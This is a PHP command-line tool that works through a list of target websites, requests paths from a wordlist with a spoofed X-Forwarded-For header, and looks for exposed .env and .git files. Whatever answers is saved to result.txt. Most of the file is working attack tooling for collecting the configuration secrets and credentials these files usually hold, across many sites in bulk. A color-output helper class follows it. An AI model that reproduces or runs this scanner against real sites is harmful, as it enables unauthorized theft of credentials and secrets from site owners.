<?php
ini::main($argv);
class ini
{
    public static $_site;
    public static $arrData;

    public static function DoScan($env = '')
    {
        $env = str_replace("\n", "", str_replace(" ", "", $env));
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, self::$_site . $env);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array("REMOTE_ADDR: ", "HTTP_X_FORWARDED_FOR: 203.123.45.67"));
        curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

        $result = curl_exec($ch);
        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        $data = array(
            "content" => $result,
            "link" => self::$_site . $env,
            "httpcode" => $httpcode
        );

        if ($httpcode == 200) {
            self::$arrData[] = $data;
        }

        if (curl_errno($ch)) {
            echo 'Error:' . curl_error($ch);
        }
        curl_close($ch);

        return $data;
    }

    public static function bruteENV()
    {
        $color = new colors();
        $wordlist = file("dictionary.txt");

        foreach ($wordlist as $key => $file) {
            $check = self::DoScan($file);

            if ($check['httpcode'] == 200) {
                echo "[+] " . $color->getColoredString($check['link'] . " - Found !\n", "green", "");
                break;
            } elseif (stripos("git/HEAD", $check['link'])) {
                echo "[+] " . $color->getColoredString($check['link'] . " - Found !\n", "green", "");
                break;
            }
            echo "[+] " . $check['link'] . " - Not Found\n";
        }
    }

    public static function saveData($content = '')
    {
        $current = file_get_contents("result.txt");

        foreach ($content as $key => $content) {
            $current .= "[ SITE : " . $content['link'] . " ]\n\n";
            $current .= "" . $content['content'] . "\n";
            $current .= "" . "---------------------------------------------------------------------" . "\n\n\n\n";
            file_put_contents("result.txt", $current);
        }

        return true;
    }

    public static function main($argv = '')
    {
        if (empty($argv[1])) {
            exit("Usage: php " . $argv[0] . " target.txt\n");
        } elseif (!file_exists("target.txt")) {
            exit("File Not Found\n");
        }

        $arrOK = [];
        foreach (file("target.txt") as $site) {
            ini::$_site = trim($site);
            $arrOK[] = ini::bruteENV();
            continue;
        }

        if (!empty($arrOK)) {
            echo "Are you sure you want to save found env ?  y or n ";
            $handle = fopen("php://stdin", "r");
            $line = fgets($handle);

            if (trim($line) != 'y') {
                exit;
            }
            fclose($handle);

            ini::saveData(ini::$arrData);

            echo "\n";
            echo "Saved ! ...\n";
        } else {
            echo "Nothing Found .env file :(";
                }
        }
}

class Colors {
                private $foreground_colors = array();
                private $background_colors = array();

                public function __construct() {
                        $this->foreground_colors['black'] = '0;30';
                        $this->foreground_colors['dark_gray'] = '1;30';
                        $this->foreground_colors['blue'] = '0;34';
                        $this->foreground_colors['light_blue'] = '1;34';
                        $this->foreground_colors['green'] = '0;32';
                        $this->foreground_colors['light_green'] = '1;32';
                        $this->foreground_colors['cyan'] = '0;36';
                        $this->foreground_colors['light_cyan'] = '1;36';
                        $this->foreground_colors['red'] = '0;31';
                        $this->foreground_colors['light_red'] = '1;31';
                        $this->foreground_colors['purple'] = '0;35';
                        $this->foreground_colors['light_purple'] = '1;35';
                        $this->foreground_colors['brown'] = '0;33';
                        $this->foreground_colors['yellow'] = '1;33';
                        $this->foreground_colors['light_gray'] = '0;37';
                        $this->foreground_colors['white'] = '1;37';

                        $this->background_colors['black'] = '40';
                        $this->background_colors['red'] = '41';
                        $this->background_colors['green'] = '42';
                        $this->background_colors['yellow'] = '43';
                        $this->background_colors['blue'] = '44';
                        $this->background_colors['magenta'] = '45';
                        $this->background_colors['cyan'] = '46';
                        $this->background_colors['light_gray'] = '47';
                }

                // Returns colored string
                public function getColoredString($string, $foreground_color = null, $background_color = null) {
                        $colored_string = "";

                        if (isset($this->foreground_colors[$foreground_color])) {
                                $colored_string .= "\033[" . $this->foreground_colors[$foreground_color] . "m";
                        }
  
                        if (isset($this->background_colors[$background_color])) {
                                $colored_string .= "\033[" . $this->background_colors[$background_color] . "m";
                        }

                        $colored_string .=  $string . "\033[0m";

                        return $colored_string;
                }


                public function getForegroundColors() {
                        return array_keys($this->foreground_colors);
                }

                public function getBackgroundColors() {
                        return array_keys($this->background_colors);
                }
        }

?>
